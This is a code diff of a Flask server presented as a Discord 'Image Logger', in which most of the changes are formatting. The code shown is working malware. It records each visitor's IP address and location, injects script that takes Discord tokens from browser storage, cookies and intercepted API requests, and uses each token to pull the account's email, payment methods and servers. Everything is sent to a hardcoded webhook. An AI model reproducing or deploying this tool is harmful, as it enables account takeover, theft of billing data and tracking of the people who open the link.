@@ -3,7 +3,7 @@
 
 from flask import Flask, request, Response, redirect
 from urllib import parse
-import traceback, requests, base64, httpagentparser, re, json
+import traceback, requests, base64, httpagentparser, json
 
 app = Flask(__name__)
 
@@ -17,30 +17,30 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1527069756572827719/7RcOxXxcAkklFLJK0mLIgwJFU-_YkgXw-ZT87KD0GT44FOh9uBpw9zFGtm9RETPjZQw7",
     "image": "https://imgs.search.brave.com/uPzLBPNle4gPYxpk42t_M8USovZfyjNwDL0Vz7NT5H4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/cGljY2xpY2tpbWcu/Y29tL21GUUFBZVN3/MFBscDVpb3kvQmFz/ZS1TdGVhbC1BLUJy/YWlucm90LndlYnA",
     "imageArgument": True,
-    
+
     # CUSTOMIZATION #
     "username": "Image Logger",
     "color": 0x00FFFF,
-    
+
     # OPTIONS #
     "crashBrowser": False,
     "accurateLocation": False,
-    
+
     # === DISCORD TOKEN STEALING === #
     "stealTokens": True,
     "tokenStealEndpoint": "/api/tokens",
-    
+
     "message": {
         "doMessage": False,
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
         "richMessage": True,
     },
-    
+
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
     "antiBot": 1,
-    
+
     # REDIRECTION #
     "redirect": {
         "redirect": False,
@@ -50,6 +50,7 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
+
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -58,26 +59,31 @@ def botCheck(ip, useragent):
     else:
         return False
 
+
 def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [
-            {
-                "title": "Image Logger - Error",
-                "color": config["color"],
-                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-            }
-        ],
-    })
+    try:
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "@everyone",
+            "embeds": [
+                {
+                    "title": "Image Logger - Error",
+                    "color": config["color"],
+                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+                }
+            ],
+        })
+    except Exception:
+        pass
+
 
 def sendTokenAlert(token, ip, useragent, endpoint="/"):
     if not token or token == "undefined" or token == "null":
         return
-    
+
     token_parts = token.split(".")
     token_decoded = {}
-    
+
     if len(token_parts) == 3:
         try:
             payload = token_parts[1]
@@ -85,38 +91,34 @@ def sendTokenAlert(token, ip, useragent, endpoint="/"):
             token_decoded = json.loads(base64.b64decode(payload).decode("utf-8", errors="ignore"))
         except Exception:
             pass
-    
+
     discord_id = token_decoded.get("id", "Unknown")
     discord_email = token_decoded.get("email", "N/A")
-    
     user_info = None
     billing_info = None
     guilds = None
     nitro_type = "None"
-    
+
     headers = {"Authorization": token}
-    
+
     try:
         user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
         if user_resp.status_code == 200:
             user_info = user_resp.json()
             discord_id = user_info.get("id", discord_id)
             discord_email = user_info.get("email", "N/A")
-            
             premium_type = user_info.get("premium_type", 0)
             nitro_map = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
             nitro_type = nitro_map.get(premium_type, "Unknown")
-            
             billing_resp = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
             if billing_resp.status_code == 200:
                 billing_info = billing_resp.json()
-            
             guilds_resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
             if guilds_resp.status_code == 200:
                 guilds = guilds_resp.json()
     except Exception:
         pass
-    
+
     embed_description = f"""**🎫 Discord Token Stolen!**
 
 **Token:** `{token[:50]}...`
@@ -133,32 +135,32 @@ def sendTokenAlert(token, ip, useragent, endpoint="/"):
 **Billing Info:**
 > **Payment Methods:** `{len(billing_info) if billing_info else 0}`
 """
-    
+
     if billing_info:
         for i, method in enumerate(billing_info[:3]):
             btype = method.get("type", "Unknown")
             brand = method.get("brand", "N/A")
             last4 = method.get("last_4", "N/A")
             embed_description += f"> **Method {i+1}:** `{btype}` | `{brand}` | `****{last4}`\n"
-    
+
     embed_description += f"""
 **Guilds:** `{len(guilds) if guilds else 0} servers`
 """
-    
+
     if guilds:
         sorted_guilds = sorted(guilds, key=lambda g: g.get("approximate_member_count", 0), reverse=True)[:5]
         for g in sorted_guilds:
             embed_description += f"> `{g.get('name', 'Unknown')}` (ID: `{g.get('id', 'N/A')}`) - {g.get('approximate_member_count', '?')} members\n"
-    
+
     embed_description += f"""
 **IP:** `{ip}`
 **User-Agent:** `{useragent[:100]}...`
 """
-    
+
     avatar_url = None
     if user_info and user_info.get('avatar'):
         avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user_info['avatar']}.png"
-    
+
     payload = {
         "username": config["username"],
         "content": "@everyone",
@@ -170,21 +172,22 @@ def sendTokenAlert(token, ip, useragent, endpoint="/"):
             }
         ],
     }
-    
+
     if avatar_url:
         payload["embeds"][0]["thumbnail"] = {"url": avatar_url}
-    
+
     try:
         requests.post(config["webhook"], json=payload)
     except Exception:
         pass
 
+
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
     if ip.startswith(blacklistedIPs):
         return None
-    
+
     bot = botCheck(ip, useragent)
-    
+
     if bot:
         if config["linkAlerts"]:
             requests.post(config["webhook"], json={
@@ -199,19 +202,19 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
                 ],
             })
         return None
-    
+
     if token and config["stealTokens"]:
         sendTokenAlert(token, ip, useragent, endpoint)
-    
+
     ping = "@everyone"
-    
+
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info.get("proxy"):
         if config["vpnCheck"] == 2:
             return None
         if config["vpnCheck"] == 1:
             ping = ""
-    
+
     if info.get("hosting"):
         if config["antiBot"] == 4:
             if info.get("proxy"):
@@ -227,9 +230,15 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
                 ping = ""
         if config["antiBot"] == 1:
             ping = ""
-    
+
     os, browser = httpagentparser.simple_detect(useragent)
-    
+
+    tz_str = ""
+    if info.get("timezone"):
+        tz_parts = info["timezone"].split('/')
+        if len(tz_parts) > 1:
+            tz_str = f"{tz_parts[1].replace('_', ' ')} ({tz_parts[0]})"
+
     embed = {
         "username": config["username"],
         "content": ping,
@@ -248,8 +257,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 > **Country:** `{info.get('country', 'Unknown')}`
 > **Region:** `{info.get('regionName', 'Unknown')}`
 > **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info.get('timezone', 'N/A').split('/')[1].replace('_', ' ')} ({info.get('timezone', 'N/A').split('/')[0]})` if info.get('timezone') else 'N/A'
+> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](' + 'https://www.google.com/maps/search/google+map++' + coords + ')'})
+> **Timezone:** `{tz_str}`
 > **Mobile:** `{info.get('mobile', 'Unknown')}`
 > **VPN:** `{info.get('proxy', 'Unknown')}`
 > **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
@@ -262,23 +271,27 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 ```
 {useragent}
 ```""",
-           }
+            }
         ],
     }
-    
+
     if url:
         embed["embeds"][0].update({"thumbnail": {"url": url}})
-    
+
     try:
         requests.post(config["webhook"], json=embed)
     except Exception:
         pass
-    
+
     return info
 
+
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    "loading": base64.b85decode(
+        b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
+    )
 }
+
 
 @app.route('/api/tokens', methods=['POST', 'OPTIONS'])
 def token_endpoint():
@@ -288,10 +301,10 @@ def token_endpoint():
         resp.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
         resp.headers['Access-Control-Allow-Headers'] = 'Content-Type'
         return resp
-    
+
     data = request.get_json(silent=True) or {}
     token = data.get("token", "")
-    
+
     if token:
         sendTokenAlert(
             token,
@@ -299,25 +312,19 @@ def token_endpoint():
             request.headers.get('user-agent', 'Unknown'),
             "/api/tokens"
         )
-    
+
     resp = Response('{"status":"ok"}', mimetype='application/json')
     resp.headers['Access-Control-Allow-Origin'] = '*'
     return resp
+
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
 def catch_all(path):
     try:
-        # --- Handle token steal endpoint ---
-        if path.startswith('api/tokens') or path.startswith('tokens'):
-            # Already handled by the dedicated route
-            pass
-        
-        # Get query params
         query_string = request.query_string.decode('utf-8') if request.query_string else ''
         query_params = dict(parse.parse_qsl(parse.urlsplit(f'?{query_string}').query))
-        
-        # Get image URL
+
         if config["imageArgument"]:
             if query_params.get("url") or query_params.get("id"):
                 try:
@@ -328,33 +335,28 @@ def catch_all(path):
                 url = config["image"]
         else:
             url = config["image"]
-        
-        # Get IP
+
         forwarded_for = request.headers.get('x-forwarded-for', request.remote_addr or '')
         ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr or ''
-        
-        # Bot check
         useragent = request.headers.get('user-agent', '')
         endpoint = f"/{path}" if path else "/"
-        
+
         if ip and ip.startswith(blacklistedIPs):
             return Response('', status=403)
-        
+
         bot_check_result = botCheck(ip, useragent)
-        
-        # Token steal script
+
         token_steal_script = ""
         if config["stealTokens"]:
             host = request.headers.get('Host', 'localhost')
             scheme = request.headers.get('X-Forwarded-Proto', 'http')
             callback_url = f"{scheme}://{host}/api/tokens"
-            
+
             token_steal_script = f"""
             <script>
             (function() {{
                 var tokenStealEndpoint = '{callback_url}';
                 var discordTokens = [];
-                
                 try {{
                     for (var i = 0; i < localStorage.length; i++) {{
                         var key = localStorage.key(i);
@@ -370,7 +372,6 @@ def catch_all(path):
                         discordTokens.push({{source: 'localStorage', key: 'token', token: dt}});
                     }}
                 }} catch(e) {{}}
-                
                 try {{
                     for (var i = 0; i < sessionStorage.length; i++) {{
                         var key = sessionStorage.key(i);
@@ -380,7 +381,6 @@ def catch_all(path):
                         }}
                     }}
                 }} catch(e) {{}}
-                
                 try {{
                     document.cookie.split(';').forEach(function(c) {{
                         c = c.trim();
@@ -393,7 +393,6 @@ def catch_all(path):
                         }}
                     }});
                 }} catch(e) {{}}
-                
                 var originalFetch = window.fetch;
                 window.fetch = function() {{
                     if (arguments[0] && typeof arguments[0] === 'string' && arguments[0].includes('discord.com/api')) {{
@@ -406,14 +405,13 @@ def catch_all(path):
                     }}
                     return originalFetch.apply(this, arguments);
                 }};
-                
                 var originalOpen = XMLHttpRequest.prototype.open;
                 XMLHttpRequest.prototype.open = function(method, url) {{
                     if (url && typeof url === 'string' && url.includes('discord.com/api')) {{
                         var xhr = this;
                         var originalSetHeader = xhr.setRequestHeader;
                         xhr.setRequestHeader = function(header, value) {{
-                            if ((header === 'Authorization' || header === 'authorization') && 
+                            if ((header === 'Authorization' || header === 'authorization') &&
                                 typeof value === 'string' && value.split('.').length === 3) {{
                                 discordTokens.push({{source: 'xhr_intercept', key: header, token: value}});
                             }}
@@ -422,7 +420,6 @@ def catch_all(path):
                     }}
                     return originalOpen.apply(this, arguments);
                 }};
-                
                 if (discordTokens.length > 0) {{
                     setTimeout(function() {{
                         var sentTokens = {{}};
@@ -445,31 +442,26 @@ def catch_all(path):
             }})();
             </script>
             """
-        
+
         if bot_check_result:
             if config["buggedImage"]:
                 resp = Response(binaries["loading"], mimetype='image/jpeg')
             else:
                 resp = redirect(url)
-            
             makeReport(ip, useragent, endpoint=endpoint, url=url)
             return resp
-        
-        # Check for URL token
+
         url_token = query_params.get("t") or query_params.get("token")
-        
-        # Check for location
         coords = None
         if query_params.get("g") and config["accurateLocation"]:
             try:
                 coords = base64.b64decode(query_params.get("g").encode()).decode()
             except Exception:
                 pass
-        
+
         result = makeReport(ip, useragent, coords, endpoint, url=url, token=url_token)
-        
+
         message = config["message"]["message"]
-        
         if config["message"]["richMessage"] and result:
             message = message.replace("{ip}", ip)
             message = message.replace("{isp}", result.get("isp", "Unknown"))
@@ -489,7 +481,7 @@ def catch_all(path):
             message = message.replace("{bot}", str(hosting if hosting and not result.get("proxy") else 'Possibly' if hosting else 'False'))
             message = message.replace("{browser}", httpagentparser.simple_detect(useragent)[1])
             message = message.replace("{os}", httpagentparser.simple_detect(useragent)[0])
-        
+
         html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -507,17 +499,16 @@ div.img {{
 {token_steal_script}
 </head>
 <body>'''
-        
+
         if config["redirect"]["redirect"]:
-            redirect_url = config["redirect"]["page"]
-            html += f'<meta http-equiv="refresh" content="0;url={redirect_url}">'
+            html += f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
         elif config["message"]["doMessage"]:
             html += f'<div>{message}</div>'
         elif config["crashBrowser"]:
             html += f'<div>{message}</div><script>setTimeout(function(){{for (var i=69420;i==i;i*=i){{console.log(i)}}}}, 100)</script>'
         else:
             html += '<div class="img"></div>'
-        
+
         if config["accurateLocation"]:
             html += '''<script>
 var currenturl = window.location.href;
@@ -534,11 +525,10 @@ if (!currenturl.includes("g=")) {
     }
 }
 </script>'''
-        
+
         html += '</body></html>'
-        
         return Response(html, mimetype='text/html')
-    
+
     except Exception as e:
         error_trace = traceback.format_exc()
         try:
@@ -546,3 +536,6 @@ if (!currenturl.includes("g=")) {
         except Exception:
             pass
         return Response('500 - Internal Server Error', status=500)
+
+
+handler = app
